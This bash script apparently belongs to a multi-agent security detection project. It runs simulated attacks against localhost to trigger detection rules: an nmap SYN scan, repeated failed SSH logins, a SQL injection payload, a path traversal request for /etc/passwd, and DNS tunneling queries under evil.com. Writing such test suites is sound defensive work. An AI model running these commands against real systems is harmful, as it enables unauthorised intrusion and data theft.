#!/usr/bin/env bash
# demo/trigger_attacks.sh — Simulates attacks to trigger all detection rules

RED='\033[0;31m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
GREEN='\033[0;32m'
BOLD='\033[1m'
RESET='\033[0m'

SLEEP=3

banner() {
  echo -e "\n${BOLD}${CYAN}╔══════════════════════════════════════════════╗${RESET}"
  echo -e "${BOLD}${CYAN}║  MULTI-AGENT CYBERSEC — DEMO ATTACK SUITE    ║${RESET}"
  echo -e "${BOLD}${CYAN}╚══════════════════════════════════════════════╝${RESET}\n"
}

attack() {
  local colour="$1"; local label="$2"; local cmd="$3"
  echo -e "${colour}${BOLD}[ATTACK] ${label}${RESET}"
  echo -e "${YELLOW}  ↳ CMD: ${cmd}${RESET}"
  eval "$cmd" 2>/dev/null || true
  echo -e "${GREEN}  ✓ Done. Sleeping ${SLEEP}s...${RESET}"
  sleep "$SLEEP"
}

banner

# ── 1. Port Scan ──────────────────────────────────────────────────────────────
attack "$RED" "PORT SCAN — nmap SYN scan on ports 1-200 (triggers port_scan detection)" \
  "nmap -sS -p 1-200 localhost"

# ── 2. SSH Brute Force ────────────────────────────────────────────────────────
attack "$RED" "SSH BRUTE FORCE — 10 failed SSH attempts (triggers brute_force_ssh detection)" \
  "for i in {1..10}; do ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 wronguser@localhost 2>/dev/null; done"

# ── 3. SQL Injection ─────────────────────────────────────────────────────────
attack "$YELLOW" "SQL INJECTION — UNION SELECT payload in HTTP request (triggers sql_injection detection)" \
  "curl -s -o /dev/null \"http://localhost/login?user=admin'%20UNION%20SELECT%201,2,3--\""

# ── 4. Path Traversal ────────────────────────────────────────────────────────
attack "$YELLOW" "PATH TRAVERSAL — ../../../etc/passwd in URI (triggers path_traversal detection)" \
  "curl -s -o /dev/null \"http://localhost/../../../etc/passwd\""

# ── 5. DNS Tunneling simulation (large DNS query via dig) ─────────────────────
attack "$CYAN" "DNS TUNNELING — Oversized DNS query label (triggers dns_tunneling detection)" \
  "dig @localhost \$(python3 -c 'import random, string; print(\"\".join(random.choices(string.ascii_lowercase, k=50)))').\$(python3 -c 'import random, string; print(\"\".join(random.choices(string.ascii_lowercase, k=50)))').evil.com 2>/dev/null || true"

echo -e "\n${GREEN}${BOLD}✅ All attack simulations complete. Check agent stdout and Kafka topic outputs.${RESET}\n"
